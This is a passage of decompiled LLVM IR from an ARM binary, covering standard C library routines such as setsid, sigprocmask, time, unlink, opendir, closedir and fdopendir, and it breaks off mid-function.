  %v0_115c4 = call i32 @__syscall_select()
  store i32 %v0_115c4, i32* @r4, align 4
  %v0_115cc = load i32, i32* @r5, align 4
  %v1_115d0 = call i32 @__libc_disable_asynccancel(i32 %v0_115cc)
  %v0_115d4 = load i32, i32* @r4, align 4
  %v2_115dc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_115dc, i32* @r4, align 4
  store i32 %v6_11568, i32* @r5, align 4
  store i32 %v9_11568, i32* @r6, align 4
  store i32 %v12_11568, i32* @r7, align 4
  store i32 %v15_11568, i32* @r8, align 4
  store i32 %v18_11568, i32* @sl, align 4
  store i32 %v21_11568, i32* @lr, align 4
  ret i32 %v0_115d4

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115a8, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115ec = load i32, i32* @r7, align 4
  store i32 %v3_115ec, i32* %stack_var_-8, align 4
  %v0_115f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_115f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_115f8, -4095
  br i1 %tmp, label %dec_label_pc_11620, label %dec_label_pc_11608

dec_label_pc_11608:                               ; preds = %entry
  %v0_1160c = call i32 @__aeabi_read_tp()
  %v3_11610 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11610 = sext i16 %v3_11610 to i32
  %v0_11614 = load i32, i32* %r2.global-to-local, align 4
  %v1_11614 = sub i32 0, %v0_11614
  store i32 %v1_11614, i32* %r2.global-to-local, align 4
  %v3_11618 = add i32 %v4_11610, %v0_1160c
  %v4_11618 = inttoptr i32 %v3_11618 to i32*
  store i32 %v1_11614, i32* %v4_11618, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11620.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11620

dec_label_pc_11620:                               ; preds = %entry, %dec_label_pc_11608
  %v1_11624 = phi i32 [ %v0_115f8, %entry ], [ -1, %dec_label_pc_11608 ]
  %v2_11620 = phi i32 [ %v3_115ec, %entry ], [ %v2_11620.pre, %dec_label_pc_11608 ]
  store i32 %v2_11620, i32* @r7, align 4
  ret i32 %v1_11624

; uselistorder directives
  uselistorder i32 %v0_115f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11620, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_11630 = icmp eq i32* %arg2, null
  br i1 %v2_11630, label %dec_label_pc_11674, label %dec_label_pc_11644

dec_label_pc_11644:                               ; preds = %entry
  %v2_11644 = load i32, i32* %arg2, align 4
  %v1_11648 = icmp slt i32 %v2_11644, 0
  br i1 %v1_11648, label %dec_label_pc_1165c, label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %dec_label_pc_11644
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_11650 = load i32, i32* %.pre3, align 4
  %v1_11654 = urem i32 %v3_11650, 2
  %v2_11654 = icmp eq i32 %v1_11654, 0
  br i1 %v2_11654, label %dec_label_pc_11674, label %dec_label_pc_1165c

dec_label_pc_1165c:                               ; preds = %dec_label_pc_11644, %dec_label_pc_11650
  %v2_1165c = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_1165c to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_11674

dec_label_pc_11674:                               ; preds = %dec_label_pc_11650, %entry, %dec_label_pc_1165c
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_116a8, label %dec_label_pc_11690

dec_label_pc_11690:                               ; preds = %dec_label_pc_11674
  %v1_11694 = sub i32 0, %arg1
  %v3_11698 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11698 = sext i16 %v3_11698 to i32
  %v0_1169c = call i32 @__aeabi_read_tp()
  %v3_116a0 = add i32 %v4_11698, %v0_1169c
  %v4_116a0 = inttoptr i32 %v3_116a0 to i32*
  store i32 %v1_11694, i32* %v4_116a0, align 4
  br label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %dec_label_pc_11674, %dec_label_pc_11690
  %v1_116b0 = phi i32 [ %arg1, %dec_label_pc_11674 ], [ -1, %dec_label_pc_11690 ]
  ret i32 %v1_116b0

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_116a8, { 1, 0 }
  uselistorder label %dec_label_pc_11674, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1165c, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_116bc = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_116cc = call i32 @gettimeofday(i32 %v2_116bc, i32 0)
  %v2_116d0 = load i32, i32* %stack_var_-16, align 4
  %v2_116d4 = icmp eq i32* %arg1, null
  br i1 %v2_116d4, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_116d0, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_116d0

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_116e8 = load i32, i32* @r7, align 4
  store i32 %v3_116e8, i32* %stack_var_-8, align 4
  %v0_116f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_116f4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_116f4, -4095
  br i1 %tmp, label %dec_label_pc_1171c, label %dec_label_pc_11704

dec_label_pc_11704:                               ; preds = %entry
  %v0_11708 = call i32 @__aeabi_read_tp()
  %v3_1170c = load i16, i16* @global_var_2225c.361, align 2
  %v4_1170c = sext i16 %v3_1170c to i32
  %v0_11710 = load i32, i32* %r2.global-to-local, align 4
  %v1_11710 = sub i32 0, %v0_11710
  store i32 %v1_11710, i32* %r2.global-to-local, align 4
  %v3_11714 = add i32 %v4_1170c, %v0_11708
  %v4_11714 = inttoptr i32 %v3_11714 to i32*
  store i32 %v1_11710, i32* %v4_11714, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1171c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1171c

dec_label_pc_1171c:                               ; preds = %entry, %dec_label_pc_11704
  %v1_11720 = phi i32 [ %v0_116f4, %entry ], [ -1, %dec_label_pc_11704 ]
  %v2_1171c = phi i32 [ %v3_116e8, %entry ], [ %v2_1171c.pre, %dec_label_pc_11704 ]
  store i32 %v2_1171c, i32* @r7, align 4
  ret i32 %v1_11720

; uselistorder directives
  uselistorder i32 %v0_116f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1171c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11728 = load i32, i32* @r4, align 4
  store i32 %v3_11728, i32* %stack_var_-24, align 4
  %v9_11728 = load i32, i32* @r6, align 4
  %v12_11728 = load i32, i32* @r7, align 4
  %v15_11728 = load i32, i32* @r8, align 4
  %v18_11728 = load i32, i32* @lr, align 4
  %v2_1172c = load i32, i32* %arg1, align 4
  store i32 %v2_1172c, i32* %r3.global-to-local, align 4
  %v3_11734 = icmp eq i32 %v2_1172c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r6, align 4
  br i1 %v3_11734, label %dec_label_pc_11748, label %dec_label_pc_11764

dec_label_pc_11748:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10b04.264 to i32), i32* %r2.global-to-local, align 4
  %v0_1174c = call i32 @__aeabi_read_tp()
  %v3_11750 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11750 = sext i16 %v3_11750 to i32
  store i32 %v4_11750, i32* %r2.global-to-local, align 4
  %v0_11754 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11754, i32* %r1.global-to-local, align 4
  %v1_11758 = add i32 %v0_11754, 10
  store i32 %v1_11758, i32* %r3.global-to-local, align 4
  %v3_1175c = add i32 %v4_11750, %v0_1174c
  %v4_1175c = inttoptr i32 %v3_1175c to i32*
  store i32 %v1_11758, i32* %v4_1175c, align 4
  %v0_1180c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1180c

dec_label_pc_11764:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_11768 = add i32 %tmp, 24
  store i32 %v1_11768, i32* %r2.global-to-local, align 4
  %v4_11770 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 68) to i32*), align 4
  store i32 %v4_11770, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1177c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1177c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11794 = load i32, i32* @r6, align 4
  %v2_11794 = add i32 %v0_11794, 16
  %v3_11794 = inttoptr i32 %v2_11794 to i32*
  %v4_11794 = load i32, i32* %v3_11794, align 4
  call void @__pseudo_branch(i32 %v4_11794)
  %v0_117a0 = load i32, i32* @r7, align 4
  %v1_117a0 = inttoptr i32 %v0_117a0 to i32*
  %v2_117a0 = load i32, i32* %v1_117a0, align 4
  store i32 %v2_117a0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_117b0 = load i32, i32* @r8, align 4
  store i32 %v0_117b0, i32* %v1_117a0, align 4
  %v0_117b4 = load i32, i32* @r6, align 4
  %v1_117b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_117b4 = add i32 %v1_117b4, %v0_117b4
  %v3_117b4 = inttoptr i32 %v2_117b4 to i32*
  %v4_117b4 = load i32, i32* %v3_117b4, align 4
  store i32 ptrtoint (i32* @global_var_117c0.389 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_117b4)
  %v0_117c0 = load i32, i32* @r7, align 4
  %v1_117c0 = add i32 %v0_117c0, 12
  %v2_117c0 = inttoptr i32 %v1_117c0 to i32*
  %v3_117c0 = load i32, i32* %v2_117c0, align 4
  store i32 %v3_117c0, i32* @r0, align 4
  %v0_117c4 = call i32 @free()
  %v0_117c8 = load i32, i32* @r7, align 4
  store i32 %v0_117c8, i32* @r0, align 4
  %v0_117cc = call i32 @free()
  %v0_117d4 = load i32, i32* @r4, align 4
  store i32 %v0_117d4, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_117d4, -4095
  br i1 %tmp11, label %dec_label_pc_11808, label %dec_label_pc_117f0

dec_label_pc_117f0:                               ; preds = %dec_label_pc_11764
  store i32 68188, i32* %r3.global-to-local, align 4
  %v0_117f4 = call i32 @__aeabi_read_tp()
  %v3_117f8 = load i16, i16* @global_var_2225c.361, align 2
  %v4_117f8 = sext i16 %v3_117f8 to i32
  store i32 %v4_117f8, i32* %r3.global-to-local, align 4
  %v0_117fc = load i32, i32* %r2.global-to-local, align 4
  %v1_117fc = sub i32 0, %v0_117fc
  store i32 %v1_117fc, i32* %r2.global-to-local, align 4
  %v3_11800 = add i32 %v4_117f8, %v0_117f4
  %v4_11800 = inttoptr i32 %v3_11800 to i32*
  store i32 %v1_117fc, i32* %v4_11800, align 4
  %v0_11804 = load i32, i32* @r8, align 4
  br label %dec_label_pc_11808

dec_label_pc_11808:                               ; preds = %dec_label_pc_11764, %dec_label_pc_117f0
  %v0_11808 = phi i32 [ %v0_117d4, %dec_label_pc_11764 ], [ %v0_11804, %dec_label_pc_117f0 ]
  store i32 %v0_11808, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %dec_label_pc_11748, %dec_label_pc_11808
  %v0_1180c = phi i32 [ %v0_1180c.pre, %dec_label_pc_11748 ], [ %v0_11808, %dec_label_pc_11808 ]
  %v2_11814 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11814, i32* @r4, align 4
  store i32 %v9_11728, i32* @r6, align 4
  store i32 %v12_11728, i32* @r7, align 4
  store i32 %v15_11728, i32* @r8, align 4
  store i32 %v18_11728, i32* @lr, align 4
  ret i32 %v0_1180c

; uselistorder directives
  uselistorder i32 %v0_117d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1180c, { 1, 0 }
  uselistorder label %dec_label_pc_11808, { 1, 0 }
}

define i32 @function_11824(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11824:
  %v0_11824 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11824, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11824
  %v2_11830 = load i32, i32* @ip, align 4
  %v3_11834 = load i32, i32* @sl, align 4
  %v8_11834 = ashr i32 %v2_11830, %v3_11834
  %v9_11834 = and i32 %v8_11834, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11824, %bb
  %v10_11834 = phi i32 [ %arg1, %dec_label_pc_11824 ], [ %v9_11834, %bb ]
  ret i32 %v10_11834

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11838 = load i32, i32* @r4, align 4
  %v6_11838 = load i32, i32* @r5, align 4
  %v9_11838 = load i32, i32* @r6, align 4
  %v12_11838 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1184c = call i32 @malloc()
  %v2_11854 = icmp eq i32 %v0_1184c, 0
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r6, align 4
  br i1 %v2_11854, label %bb, label %dec_label_pc_11864

bb:                                               ; preds = %entry
  br label %dec_label_pc_118f0

dec_label_pc_11864:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11868 = load i32, i32* @r4, align 4
  %v2_11868 = icmp ugt i32 %v0_11868, 511
  %v2_1186c = add i32 %v0_1184c, 4
  %v3_1186c = inttoptr i32 %v2_1186c to i32*
  store i32 0, i32* %v3_1186c, align 4
  %v0_11870 = load i32, i32* %r3.global-to-local, align 4
  %v2_11870 = add i32 %v0_1184c, 16
  %v3_11870 = inttoptr i32 %v2_11870 to i32*
  store i32 %v0_11870, i32* %v3_11870, align 4
  %v0_11874 = load i32, i32* %r3.global-to-local, align 4
  %v2_11874 = add i32 %v0_1184c, 8
  %v3_11874 = inttoptr i32 %v2_11874 to i32*
  store i32 %v0_11874, i32* %v3_11874, align 4
  br i1 %v2_11868, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_11864
  %v0_1187c2 = load i32, i32* @r4, align 4
  %v2_1187c3 = add i32 %v0_1184c, 20
  %v3_1187c4 = inttoptr i32 %v2_1187c3 to i32*
  store i32 %v0_1187c2, i32* %v3_1187c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_11864
  %v1_11878 = load i32, i32* %r3.global-to-local, align 4
  %v2_11878 = add i32 %v1_11878, 512
  store i32 %v2_11878, i32* %r3.global-to-local, align 4
  %v0_1187c = load i32, i32* @r4, align 4
  %v2_1187c = add i32 %v0_1184c, 20
  %v3_1187c = inttoptr i32 %v2_1187c to i32*
  store i32 %v0_1187c, i32* %v3_1187c, align 4
  %v1_11880 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11880, i32* %v3_1187c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_1184c, i32* @r5, align 4
  %v0_11888 = load i32, i32* @r7, align 4
  %v2_11888 = inttoptr i32 %v0_1184c to i32*
  store i32 %v0_11888, i32* %v2_11888, align 4
  %v0_1188c = load i32, i32* @r5, align 4
  %v1_1188c = add i32 %v0_1188c, 20
  %v2_1188c = inttoptr i32 %v1_1188c to i32*
  %v3_1188c = load i32, i32* %v2_1188c, align 4
  store i32 %v3_1188c, i32* %r1.global-to-local, align 4
  %v2_11894 = call i32 @calloc(i32 1, i32 %v3_1188c)
  %v2_11898 = icmp eq i32 %v2_11894, 0
  store i32 %v2_11894, i32* @r4, align 4
  %v1_118a0 = load i32, i32* @r5, align 4
  %v2_118a0 = add i32 %v1_118a0, 12
  %v3_118a0 = inttoptr i32 %v2_118a0 to i32*
  store i32 %v2_11894, i32* %v3_118a0, align 4
  br i1 %v2_11898, label %dec_label_pc_118a8, label %dec_label_pc_118b8

dec_label_pc_118a8:                               ; preds = %bb17
  %v0_118a8 = load i32, i32* @r5, align 4
  store i32 %v0_118a8, i32* @r0, align 4
  %v0_118ac = call i32 @free()
  %v0_118b0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_118f0

dec_label_pc_118b8:                               ; preds = %bb17
  %v0_118bc = load i32, i32* @r6, align 4
  %v2_118bc = add i32 %v0_118bc, -34036
  store i32 %v2_118bc, i32* %r3.global-to-local, align 4
  %v1_118c4 = inttoptr i32 %v2_118bc to i32*
  %v2_118c4 = load i32, i32* %v1_118c4, align 4
  %v3_118c4 = add i32 %v0_118bc, -34032
  %v4_118c4 = inttoptr i32 %v3_118c4 to i32*
  %v5_118c4 = load i32, i32* %v4_118c4, align 4
  store i32 %v5_118c4, i32* %r1.global-to-local, align 4
  %v6_118c4 = add i32 %v0_118bc, -34028
  %v7_118c4 = inttoptr i32 %v6_118c4 to i32*
  %v8_118c4 = load i32, i32* %v7_118c4, align 4
  store i32 %v8_118c4, i32* %r2.global-to-local, align 4
  %v9_118c4 = add i32 %v0_118bc, -34024
  %v10_118c4 = inttoptr i32 %v9_118c4 to i32*
  %v11_118c4 = load i32, i32* %v10_118c4, align 4
  store i32 %v11_118c4, i32* %r3.global-to-local, align 4
  %v12_118c4 = add i32 %v0_118bc, -34020
  %v1_118d0 = inttoptr i32 %v12_118c4 to i32*
  %v2_118d0 = load i32, i32* %v1_118d0, align 4
  %v3_118d0 = add i32 %v0_118bc, -34016
  %v4_118d0 = inttoptr i32 %v3_118d0 to i32*
  %v5_118d0 = load i32, i32* %v4_118d0, align 4
  store i32 %v2_118d0, i32* %stack_var_-32, align 4
  store i32 %v5_118c4, i32* %r1.global-to-local, align 4
  store i32 %v8_118c4, i32* %r2.global-to-local, align 4
  store i32 %v11_118c4, i32* %r3.global-to-local, align 4
  %v0_118e0 = load i32, i32* @r5, align 4
  %v1_118e0 = add i32 %v0_118e0, 24
  %v1_118e4 = inttoptr i32 %v1_118e0 to i32*
  store i32 %v2_118c4, i32* %v1_118e4, align 4
  %v3_118e4 = add i32 %v0_118e0, 28
  %v4_118e4 = inttoptr i32 %v3_118e4 to i32*
  %v5_118e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_118e4, i32* %v4_118e4, align 4
  %v6_118e4 = add i32 %v0_118e0, 32
  %v7_118e4 = inttoptr i32 %v6_118e4 to i32*
  %v8_118e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_118e4, i32* %v7_118e4, align 4
  %v9_118e4 = add i32 %v0_118e0, 36
  %v10_118e4 = inttoptr i32 %v9_118e4 to i32*
  %v11_118e4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_118e4, i32* %v10_118e4, align 4
  %v12_118e4 = add i32 %v0_118e0, 40
  %v2_118e8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_118d0, i32* %r1.global-to-local, align 4
  %v1_118ec = inttoptr i32 %v12_118e4 to i32*
  store i32 %v2_118e8, i32* %v1_118ec, align 4
  %v3_118ec = add i32 %v0_118e0, 44
  %v4_118ec = inttoptr i32 %v3_118ec to i32*
  %v5_118ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_118ec, i32* %v4_118ec, align 4
  %v0_118f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %bb, %dec_label_pc_118a8, %dec_label_pc_118b8
  %v0_118f0 = phi i32 [ 0, %bb ], [ %v0_118b0, %dec_label_pc_118a8 ], [ %v0_118f0.pre, %dec_label_pc_118b8 ]
  store i32 %v3_11838, i32* @r4, align 4
  store i32 %v6_11838, i32* @r5, align 4
  store i32 %v9_11838, i32* @r6, align 4
  store i32 %v12_11838, i32* @r7, align 4
  ret i32 %v0_118f0

; uselistorder directives
  uselistorder i32 %v2_11894, { 1, 0, 2 }
  uselistorder i32 %v0_1184c, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_118f0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_11908 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11910 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_11940, label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %entry
  %v0_1192c = call i32 @__aeabi_read_tp()
  %v3_11930 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11930 = sext i16 %v3_11930 to i32
  %v0_11934 = load i32, i32* %r2.global-to-local, align 4
  %v1_11934 = sub i32 0, %v0_11934
  store i32 %v1_11934, i32* %r2.global-to-local, align 4
  %v3_11938 = add i32 %v4_11930, %v0_1192c
  %v4_11938 = inttoptr i32 %v3_11938 to i32*
  store i32 %v1_11934, i32* %v4_11938, align 4
  br label %dec_label_pc_11964

dec_label_pc_11940:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_11940 = icmp slt i32 %arg1, 0
  br i1 %v1_11940, label %dec_label_pc_11964, label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %dec_label_pc_11940
  store i32 %v2_11910, i32* @r1, align 4
  %v0_1194c = call i32 @fstat()
  %v1_11950 = icmp slt i32 %v0_1194c, 0
  br i1 %v1_11950, label %dec_label_pc_11958, label %dec_label_pc_1196c

dec_label_pc_11958:                               ; preds = %dec_label_pc_11948
  br label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %dec_label_pc_11958, %dec_label_pc_11940, %dec_label_pc_11928
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119b0

dec_label_pc_1196c:                               ; preds = %dec_label_pc_11948
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_11974 = load i32, i32* @r7, align 4
  %v3_11978 = call i32 @__GI___fcntl_nocancel(i32 %v0_11974, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11980 = load i32, i32* @r7, align 4
  %v2_11984 = call i32 @fd_to_DIR(i32 %v0_11980, i32 %tmp)
  store i32 %v2_11984, i32* %r1.global-to-local, align 4
  %v2_11988 = icmp eq i32 %v2_11984, 0
  br i1 %v2_11988, label %dec_label_pc_11990, label %dec_label_pc_119b0

dec_label_pc_11990:                               ; preds = %dec_label_pc_1196c
  %v0_119a0 = call i32 @__aeabi_read_tp()
  %v3_119a4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_119a4 = sext i16 %v3_119a4 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_119ac = add i32 %v4_119a4, %v0_119a0
  %v4_119ac = inttoptr i32 %v3_119ac to i32*
  store i32 12, i32* %v4_119ac, align 4
  %v0_119b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119b0

dec_label_pc_119b0:                               ; preds = %dec_label_pc_1196c, %dec_label_pc_11964, %dec_label_pc_11990
  %v0_119b0 = phi i32 [ %v2_11984, %dec_label_pc_1196c ], [ 0, %dec_label_pc_11964 ], [ %v0_119b0.pre, %dec_label_pc_11990 ]
  store i32 %v3_11908, i32* @r7, align 4
  ret i32 %v0_119b0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_119b0, { 2, 0, 1 }
}

define i32 @"$d.10"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_119c0:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_119c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_119c0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_119c0
  %tmp3 = inttoptr i32 %arg2 to i16*
  %v1_119c0 = load i32, i32* @r8, align 4
  %v5_119c0 = mul i32 %tmp, 65536
  %v6_119c0 = and i32 %v1_119c0, %v5_119c0
  %v6_119c4 = udiv i32 %v6_119c0, 262144
  %v7_119c4 = and i32 %v6_119c4, %arg2
  store i32 %v7_119c4, i32* %r0.global-to-local, align 4
  %v2_119c8 = trunc i32 %v7_119c4 to i16
  store i16 %v2_119c8, i16* %tmp3, align 2
  %v6_119c8 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_119c0, %bb
  %v10_119c8 = phi i32 [ %tmp, %dec_label_pc_119c0 ], [ %v6_119c8, %bb ]
  ret i32 %v10_119c8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_119d0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_119d0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_119dc = call i32 @fstat()
  store i32 %v0_119dc, i32* @r5, align 4
  %v2_119e0 = icmp eq i32 %v0_119dc, 0
  br i1 %v2_119e0, label %dec_label_pc_119e8, label %dec_label_pc_11a60

dec_label_pc_119e8:                               ; preds = %entry
  %v1_119ec = and i32 %tmp4, 61440
  store i32 %v1_119ec, i32* @r3, align 4
  %v7_119f0 = icmp eq i32 %v1_119ec, 16384
  br i1 %v7_119f0, label %dec_label_pc_11a10, label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %dec_label_pc_119e8
  %v0_119fc = call i32 @__aeabi_read_tp()
  %v3_11a00 = load i16, i16* @global_var_2225c.361, align 2
  %v0_11a04 = load i32, i32* @r5, align 4
  store i32 %v0_11a04, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a10:                               ; preds = %dec_label_pc_119e8
  %v0_11a10 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11a18 = call i32 @__libc_fcntl(i32 %v0_11a10, i32 3)
  %v7_11a1c = icmp eq i32 %v2_11a18, -1
  br i1 %v7_11a1c, label %dec_label_pc_11a60, label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a10
  %v1_11a24 = urem i32 %v2_11a18, 4
  store i32 %v1_11a24, i32* %r3.global-to-local, align 4
  %v7_11a28 = icmp eq i32 %v1_11a24, 1
  br i1 %v7_11a28, label %dec_label_pc_11a30, label %dec_label_pc_11a4c

dec_label_pc_11a30:                               ; preds = %dec_label_pc_11a24
  %v0_11a34 = call i32 @__aeabi_read_tp()
  %v3_11a38 = load i16, i16* @global_var_2225c.361, align 2
  %v0_11a3c = load i32, i32* @r5, align 4
  store i32 %v0_11a3c, i32* %r1.global-to-local, align 4
  %v0_11a40 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a40 = add i32 %v0_11a40, 21
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_119f8, %dec_label_pc_11a30
